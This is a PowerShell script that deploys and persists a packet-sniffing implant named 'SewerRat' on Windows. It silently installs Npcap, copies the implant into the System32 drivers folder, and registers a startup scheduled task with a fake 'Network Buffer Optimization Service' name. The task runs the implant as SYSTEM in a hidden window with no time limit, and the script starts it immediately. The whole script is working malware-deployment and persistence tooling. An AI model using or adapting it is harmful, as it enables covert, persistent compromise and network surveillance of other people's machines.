# ============================================================================
# SewerRat PowerShell Deployment Script
# REQUIRES: Administrator Privileges
# ============================================================================

# Elevate privileges if not running as Admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "[-] This script requires Administrator privileges. Please run as Administrator."
    exit
}

$ScriptDir = $PSScriptRoot
if ([string]::IsNullOrEmpty($ScriptDir)) { $ScriptDir = "." }

$LocalImplant = Join-Path $ScriptDir "SewerRat.exe"
$DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
$LocalNpcap = Join-Path $ScriptDir "npcap-1.87.exe"
$ServiceName = "Win32NetworkBuffer"

Write-Host "[*] Checking for Npcap installer at $LocalNpcap..."
if (-Not (Test-Path $LocalNpcap)) {
    Write-Host "[-] local Npcap installer not found! Make sure to transfer it."
    exit
}

Write-Host "[*] Installing Npcap silently (Required for Layer 2 Packet Sniffing)..."
try {
    $process = Start-Process -FilePath $LocalNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
    if ($process.ExitCode -eq 0) {
        Write-Host "[+] Npcap installed successfully."
    } else {
        Write-Host "[-] Npcap installation may have encountered an issue (Exit Code: $($process.ExitCode)). Continuing anyway..."
    }
} catch {
    Write-Host "[-] Failed to execute Npcap installer: $_"
}

Write-Host "[*] Checking for SewerRat implant at $LocalImplant..."
if (-Not (Test-Path $LocalImplant)) {
    Write-Host "[-] local SewerRat implant not found! Make sure to transfer it."
    exit
}

Write-Host "[*] Persisting SewerRat implant to $DestPath..."
try {
    Copy-Item -Path $LocalImplant -Destination $DestPath -Force
    Write-Host "[+] Implant copied successfully: $DestPath"
} catch {
    Write-Host "[-] Failed to copy implant: $_"
    exit
}

Write-Host "[*] Creating persistence via Scheduled Task '$ServiceName'..."
try {
    # If the task already exists, unregister it
    if (Get-ScheduledTask -TaskName $ServiceName -ErrorAction SilentlyContinue) {
        Write-Host "[!] Scheduled task already exists. Cleaning up old task..."
        Unregister-ScheduledTask -TaskName $ServiceName -Confirm:$false
        Start-Sleep -Seconds 2
    }

    # Setup the Action (what to run) -> hidden PowerShell to spawn it silently
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"`& '$DestPath'`""

    # Setup the Trigger (when to run) -> At startup
    $Trigger = New-ScheduledTaskTrigger -AtStartup

    # Setup the Principal (who to run as) -> SYSTEM user with highest privileges
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest

    # Setup the Settings -> Allow it to run indefinitely and don't kill it after 3 days
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 0)

    # Register the Scheduled Task
    Register-ScheduledTask -TaskName $ServiceName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Network Buffer Optimization Service for Startup" | Out-Null

    Write-Host "[+] Scheduled Task created successfully."

} catch {
    Write-Host "[-] Failed to create Scheduled Task: $_"
    exit
}

Write-Host "[*] Starting the implant process explicitly..."
try {
    # Start the task manually so it runs right now without needing a reboot
    Start-ScheduledTask -TaskName $ServiceName
    Write-Host "[+] Task triggered successfully! SewerRat is now running silently."
} catch {
    Write-Host "[-] Failed to trigger task: $_"
}

Write-Host "[*] Deployment complete!"